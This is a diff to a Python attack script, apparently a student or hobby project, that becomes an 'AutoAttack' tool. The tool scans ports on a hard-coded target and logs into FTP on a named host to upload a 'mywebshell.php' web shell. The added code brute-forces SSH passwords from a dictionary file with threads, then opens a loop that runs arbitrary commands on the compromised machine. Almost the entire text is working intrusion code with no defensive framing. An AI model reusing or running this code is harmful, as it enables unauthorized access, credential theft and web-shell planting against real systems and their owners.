@@ -4,25 +4,43 @@
 from datetime import datetime
 import queue
 import threading
+import ipaddress
 import socket
 import os
-import time
 import ftplib
+import webbrowser
+# import argparse
+import time
+import paramiko
+from paramiko import SSHClient, AutoAddPolicy
+import logging
+from colorama import Fore, init
+# import getpass
+# import telnetlib
+# import requests
 
-
-class PortAttack:
+class AutoAttack:
   def __init__(self):
+    # self.target = input("Input target IP : ")
     self.target = "192.168.0.34"
     self.target_ports = []
+
     # self.ftp_host = input("Input target TCP host : ")
     # self.ftp_username = input("Input target TCP username : ")
-    # self.ftp_redirect = input("Input injection code : ")  #삽입할 코드 입력
     self.ftp_flag = False
+    # self.ftp_redirect = input("Input injection code : ")  #삽입할 코드 입력
     self.ftp_host = "www.kae.kr"
     self.ftp_username = "master"
     self.ftp_passwd = None
     self.ftp_redirect = "ls -al"
-    self.ftp_set_path = "/home/" + self.ftp_username + "/public_html/aheun"
+    #self.ftp_set_path = "/home/" + self.ftp_username + "/public_html/master"
+    self.ftp_set_path = "/home/aheun"
+
+    self.ssh_flag = False
+    self.ssh_username = "master"
+    self.ssh_passwd = None
+    # self.ssh_code_inject = input("Input injection code : ")
+    self.ssh_code_inject = ""
 
 
   ############### before attack, check is port open ###############
@@ -66,8 +84,12 @@ class PortAttack:
 
     # 연결된다면 q에 확인할 포트 넣기
     if alive == 0:
+      print("connect target")
       for port in chk_ports:
         q.put(port)
+    else:
+      print("can not find target")
+      exit()
 
     for i in range(10):
       t = threading.Thread(target = self.scanPort)
@@ -111,11 +133,11 @@ class PortAttack:
     try:
       dirList = ftp.nlst() #현재 디렉토리 파일 확인
       print("dirList : ", dirList)
+      return dirList
     except: 
       dirList = []
       print ('[-] Could not list directory contents.')
       print ('[-] Skipping To Next Target.')
-      return
 
     retList = []
     for fileName in dirList:
@@ -140,7 +162,7 @@ class PortAttack:
 
     with open(upload_file, 'rb') as read_f:
       # 기존 파일 덮어쓰려면 page 넣기
-      ftp.storlines('STOR ' + page, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
+      # ftp.storlines('STOR ' + page, read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
       # 새로 만들려면 파일명 직접 넣기
       ftp.storlines('STOR ' + "mywebshell.php", read_f) #아스키모드에서 FTP클라이언트에서 FTP 서버로 파일 송신
 
@@ -158,7 +180,7 @@ class PortAttack:
 
       ftp_conn.cwd(self.ftp_set_path) # 설정한 경로로 이동
       defPages = self.returnDefault(ftp_conn) # 설정 경로의 웹 페이지들 확인
-      print(defPages)
+      print("pages", defPages)
 
       self.injectPage(ftp_conn, defPages[0], self.ftp_redirect) #injectPage 호출
       # for defPage in defPages:
@@ -199,8 +221,80 @@ class PortAttack:
     print("[ end ftp attack ]")
 
 
-  def sshAttack():
-    pass       
+  ############### ssh attack : sshAttack ->  ###############
+  def sshBrute(self):
+    while True:
+      if q.empty():
+        break
+
+      if(self.ssh_flag):
+        while(not q.empty()):
+          q.get();
+        break;
+      
+      passwd = q.get()
+      print("*** ", passwd)
+
+      try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(AutoAddPolicy())
+        chk = ssh.connect(self.target, port=22, username=self.ssh_username, password=passwd)
+      except Exception: # paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException
+        pass
+      else:
+        # correct credentials
+        print("[*] Found credentials: " + passwd)
+        self.ssh_passwd = passwd
+        self.ssh_flag = True
+
+
+  def sshInjection(self):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(AutoAddPolicy())
+    ssh.connect(self.target, port=22, username=self.ssh_username, password=self.ssh_passwd)
+
+    while True:
+      ssh_code_inject = input("Input injection code(finish -1) : ")
+      if (ssh_code_inject == "-1"):
+        break
+
+      stdin, stdout, stderr = ssh.exec_command(ssh_code_inject)
+      print("".join(stdout.readlines()))
+
+
+  def sshAttack(self):
+    print("\n\n[ ssh attack ]")
+    global q
+    threads = [] # 스레드 관리 목록
+    passwdFile = "dic_passwd.txt"
+
+    q = queue.Queue()
+    alive = self.chkOpenPort(22)
+
+    if (alive):
+      # dic_passwd.txt 읽어서 queue에 저장
+      with open(passwdFile, 'rt') as f:
+        passwds = f.readlines()
+      for passwd in passwds:
+        passwd = passwd.rstrip()
+        q.put(passwd)
+
+    for i in range(10):
+      t = threading.Thread(target = self.sshBrute)
+      t.start()
+      threads.append(t)
+
+    # 모든 스레드가 종료될 때까지 대기
+    for t in threads:
+      t.join()
+
+    # 확보한 pw로 공격진행
+    if self.ssh_passwd != None:
+      print('[+] Using creds: ' + self.ssh_username + '/' + self.ssh_passwd + ' to attack')
+      self.sshInjection()
+
+    print("[ end ssh attack ]")
+
 
   def telnetAttack():
     pass
@@ -208,13 +302,18 @@ class PortAttack:
   def smtpAttack():
     pass
 
+  def prn(self):
+    pass
+
 
 def main():
-  print("Start Program")  
-  a1 = PortAttack()
+  print("Start Program")
+  
+  a1 = AutoAttack()
   a1.scanner()
   a1.ftpAttack()
-
+  a1.sshAttack()
+  
 
 if __name__ == "__main__":
   main()
